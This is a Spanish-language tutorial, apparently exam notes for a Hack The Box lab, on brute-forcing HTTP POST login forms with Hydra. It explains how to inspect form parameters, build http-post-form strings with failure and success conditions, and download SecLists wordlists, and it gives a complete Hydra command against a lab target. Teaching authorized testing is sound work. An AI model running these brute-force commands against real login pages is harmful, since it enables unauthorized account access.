
## 1. Funcionamiento de los formularios de inicio de sesión

Los formularios de login suelen enviar las credenciales mediante una petición HTTP `POST`.

Ejemplo de formulario HTML:

```
<form action="/login" method="post">
    <input type="text" name="username">
    <input type="password" name="password">
    <input type="submit" value="Login">
</form>
```

La petición HTTP generada sería similar a esta:

```
POST /login HTTP/1.1
Host: www.example.com
Content-Type: application/x-www-form-urlencoded

username=john&password=secret123
```

**Elementos importantes:**

- **Método HTTP:** normalmente `POST`.
    
- **Ruta:** endpoint al que se envían las credenciales, como `/login` o `/`.
    
- **Parámetros:** nombres exactos de los campos, como `username` y `password`.
    
- **Condición de fallo o éxito:** texto o respuesta HTTP que permita identificar si las credenciales son válidas.
    

---

## 2. Inspeccionar el formulario antes de utilizar Hydra

Antes de construir el comando, hay que identificar cómo funciona el formulario.

### Inspección del HTML

1. Abre la página de login.
    
2. Haz clic derecho y selecciona **Inspeccionar**.
    
3. Busca la etiqueta `<form>` y sus campos `<input>`.
    
4. Identifica el método, la ruta y los nombres de los parámetros.
    

Ejemplo:

```
<form method="POST">
    <input type="text" id="username" name="username">
    <input type="password" id="password" name="password">
    <input type="submit" value="Login">
</form>
```

En este caso:

- Método: `POST`.
    
- Ruta: `/` (si el formulario se envía a la raíz).
    
- Usuario: `username`.
    
- Contraseña: `password`.
    

### Inspección con las herramientas de desarrollo

1. Pulsa `F12`.
    
2. Abre la pestaña **Network**.
    
3. Envía un intento de login con credenciales de prueba.
    
4. Selecciona la petición generada.
    
5. Revisa la ruta, el método, los datos del formulario y la respuesta del servidor.
    

También puedes interceptar la petición con **Burp Suite** u **OWASP ZAP** para examinar sus parámetros y cabeceras.

> **Importante:** no supongas que todos los formularios utilizan los mismos parámetros. Debes comprobar los nombres exactos y la ruta real.

## 3. Hydra: módulo `http-post-form`

El módulo `http-post-form` automatiza los intentos de autenticación contra formularios HTTP que utilizan peticiones `POST`.

### Sintaxis general

```
hydra [opciones] IP http-post-form "ruta:parametros:condicion"
```

La cadena contiene tres componentes:

|Componente|Descripción|
|---|---|
|`ruta`|Endpoint que recibe las credenciales.|
|`parametros`|Campos enviados en la petición POST.|
|`condicion`|Criterio utilizado para identificar los intentos fallidos o exitosos.|

### Marcadores de posición

Hydra sustituye estos marcadores en cada intento:

- `^USER^`: nombre de usuario.
    
- `^PASS^`: contraseña.
    

Por ejemplo:

```
/:username=^USER^&password=^PASS^:F=Invalid credentials
```

Desglose:

- `/`: ruta del formulario.
    
- `username=^USER^`: parámetro del usuario.
    
- `password=^PASS^`: parámetro de la contraseña.
    
- `F=Invalid credentials`: texto que identifica un intento fallido.
    

---

## 4. Condiciones de fallo y éxito

Hydra necesita un criterio para distinguir las credenciales válidas de las inválidas.

### Condición de fallo: `F=`

Se utiliza cuando la respuesta contiene un mensaje característico de un login fallido.

```
hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid credentials"
```

Si la respuesta contiene `Invalid credentials`, Hydra considera fallido ese intento y continúa.

### Condición de éxito: `S=`

Se utiliza cuando la respuesta contiene un indicador de autenticación correcta.

Por ejemplo, si la aplicación muestra `Dashboard` después de iniciar sesión:

```
hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:S=Dashboard"
```

También puede utilizarse una redirección HTTP `302` como indicador, si se ha comprobado que corresponde a un inicio de sesión correcto:

```
hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:S=302"
```

**Diferencia principal:**

- `F=`: identifica una respuesta de fallo.
    
- `S=`: identifica una respuesta de éxito.
    

La condición debe coincidir con el comportamiento real de la aplicación. No debes asumir que cualquier redirección `302` significa que el login ha funcionado.

---

## 5. Construir la cadena de parámetros

Supongamos que hemos identificado los siguientes datos:

- Ruta: `/`.
    
- Campo de usuario: `username`.
    
- Campo de contraseña: `password`.
    
- Mensaje de error: `Invalid credentials`.
    

La cadena será:

```
/:username=^USER^&password=^PASS^:F=Invalid credentials
```

Esta cadena reproduce los parámetros que enviaría el formulario e indica a Hydra cómo detectar los intentos fallidos.

### Campos adicionales

Si el formulario incluye otros campos, también puede ser necesario incorporarlos a la petición.

Por ejemplo:

- Campos ocultos.
    
- Tokens CSRF.
    
- Parámetros adicionales requeridos por la aplicación.
    

Si un token cambia con cada petición, no basta con añadir un valor estático: hay que averiguar cómo obtener y enviar un token válido para cada intento.

## 6. Ataque con Hydra: ejemplo de HTB

### Descargar las wordlists

Lista de nombres de usuario:

```
curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt
```

Lista de contraseñas:

```
curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt
```

### Ejecutar Hydra

```
hydra -L top-usernames-shortlist.txt \
-P 2023-200_most_used_passwords.txt \
-f IP -s 5000 \
http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
```

**Parámetros utilizados:**

|Opción|Función|
|---|---|
|`-L`|Archivo con una lista de nombres de usuario.|
|`-P`|Archivo con una lista de contraseñas.|
|`-f`|Detiene el ataque contra el objetivo cuando encuentra una pareja válida.|
|`-s 5000`|Puerto del servicio HTTP.|
|`http-post-form`|Módulo para formularios HTTP que utilizan POST.|
|`IP`|Dirección IP del objetivo de laboratorio.|

**Importante:** sustituye `IP` por la dirección real del objetivo de HTB. En este ejemplo, el servicio utiliza el puerto `5000`.

Hydra combina los usuarios y las contraseñas de las listas y analiza las respuestas para detectar posibles credenciales válidas.

Si encuentra una combinación válida, el resultado mostrará el usuario y la contraseña identificados.

## 7. Flujo de trabajo para el examen

Cuando encuentres un formulario de login en un laboratorio autorizado, sigue este orden:

1. **Inspeccionar el formulario:** identificar el método HTTP y la ruta.
    
2. **Identificar los parámetros:** comprobar los nombres exactos de usuario y contraseña.
    
3. **Realizar una prueba manual:** enviar credenciales incorrectas.
    
4. **Examinar la respuesta:** localizar el mensaje de error o el indicador de éxito.
    
5. **Construir la cadena de Hydra:** incluir ruta, parámetros y condición.
    
6. **Seleccionar las wordlists:** elegir las listas adecuadas de usuarios y contraseñas.
    
7. **Ejecutar Hydra:** utilizar el módulo `http-post-form` y el puerto correcto.
    
8. **Validar las credenciales:** comprobar manualmente que funcionan.
    
9. **Completar el laboratorio:** iniciar sesión y recuperar la flag.
    

### Errores frecuentes

- Usar `user` en lugar de `username` cuando el formulario espera `username`.
    
- Apuntar a `/login` cuando el formulario realmente se envía a `/`.
    
- Utilizar `http-get` en lugar de `http-post-form`.
    
- No especificar el puerto correcto.
    
- Elegir una condición `F=` que no aparece en las respuestas.
    
- Ignorar campos adicionales o tokens CSRF necesarios para autenticar.
    
- Interpretar una respuesta diferente como un éxito sin comprobarlo manualmente.
    

**Idea clave:** el éxito de Hydra depende de reproducir correctamente la petición HTTP del formulario y definir una condición que permita distinguir los intentos fallidos de los exitosos.
